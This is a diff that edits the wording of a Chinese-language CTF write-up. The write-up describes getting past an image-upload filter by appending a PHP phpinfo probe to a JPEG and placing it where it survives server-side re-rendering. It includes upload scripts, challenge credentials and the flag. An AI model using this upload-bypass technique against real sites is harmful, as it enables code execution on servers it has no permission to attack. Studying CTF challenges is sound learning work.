@@ -31,7 +31,7 @@ enctype="multipart/form-data">
 
 没有多余的内容，可以确定 `upload.php?type=upload` 就是一个上传文件的接口，并且 FormData 中仅有一个 `file` 项。
 
-试着把 [阿猫](./assets/avatar.jpg) 传上去看看：
+试着上传个 [阿猫](./assets/avatar.jpg) 看看：
 
 TODO:upload-1.screenshot.jpg
 
@@ -39,7 +39,9 @@ TODO:upload-1.screenshot.jpg
 <img src="image/190413104517_315539082.jpg"><br>[Check Error]上传的图片源代码中未包含指定字符串:<font color="red">phpinfo()</font>
 ```
 
-那么意思是要把 phpinfo() 塞进文件里。
+所以意思是要把 phpinfo() 塞进文件里咯。
+
+![](https://media.giphy.com/media/8Rx1VaCae7OCs/giphy.gif)
 
 为了方便调试，先写个上传文件的脚本：
 
@@ -85,7 +87,7 @@ if (module.parent) {
 })()
 ```
 
-那么写个满足要求的探针文件 `probe.php`：
+再写个满足要求的探针文件 `probe.php`：
 
 ```php
 <?php phpinfo() ?>
@@ -98,13 +100,13 @@ node ./upload.js ./assets/probe.php
 # <- {"source":"http://117.51.148.166/undefined","message":"请上传JPG/GIF/PNG格式的图片文件"}
 ```
 
-看来还做了文件类型检查。试下将 `probe.php` 的内容放到图片文件的尾部：
+看来还做了文件类型检查。再试下将 `probe.php` 的内容放到图片文件的尾部：
 
 ```sh
 cat ./assets/avatar.jpg ./assets/probe.php > ./vendors/probe.jpg
 ```
 
-检查下文件内容：
+检查文件内容：
 
 ```sh
 xxd ./vendors/probe.jpg
@@ -131,7 +133,9 @@ node ./upload.js vendors/probe.jpg
 # <- {"source":"http://117.51.148.166/image/190419094301_1940362407.jpg","message":"[Check Error]上传的图片源代码中未包含指定字符串:<font color=\"red\">phpinfo()</font>"}
 ```
 
-居然失败了。把上传后的文件下载下来看看：
+居然失败了。
+
+把上传后的文件下载下来，发现尾部内容消失了，文件体积也明显和原来不一样 (38KB -> 28KB) —— 看样子是经历了 **二次渲染**：
 
 ```sh
 curl -u dd@ctf:DD@ctf#000 -s http://117.51.148.166/image/190419094301_1940362407.jpg | xxd
@@ -150,8 +154,6 @@ curl -u dd@ctf:DD@ctf#000 -s http://117.51.148.166/image/190419094301_1940362407
 00006f40: 3ff7 63fc 8ff8 d3bf b567 feec 7f91 ff00  ?.c......g......
 00006f50: 1a04 7fff d9                             .....
 ```
-
-尾部内容消失了，文件体积也明显和原来不一样 (38KB -> 28KB) —— 看样子是经历了 **二次渲染**。
 
 那么再尝试把被 [二次渲染过的图片](./vendors/190413104517_315539082.jpg) 重新上传一次，拿到 [被第三次渲染的文件](./vendors/190413104640_171516771.jpg)。
 由于这两次渲染操作都是出自同一份渲染器，所以体积差别不大（~28K），其次二进制内容也容易出现相同的片段。
@@ -265,7 +267,7 @@ node ./upload.js ./vendors/inject-output/2.jpg
 # <- {"source":"http://117.51.148.166/image/190419102134_1307243295.jpg","message":"[Success]Flag=DDCTF{B3s7_7ry_php1nf0_b92ef5babce79fad}"}
 ```
 
-获得 flag `DDCTF{B3s7_7ry_php1nf0_b92ef5babce79fad}`，拿下第三关。
+于是获得 flag `DDCTF{B3s7_7ry_php1nf0_b92ef5babce79fad}`，顺利拿下第三关 :v:。
 
 
 ### 涉及资料
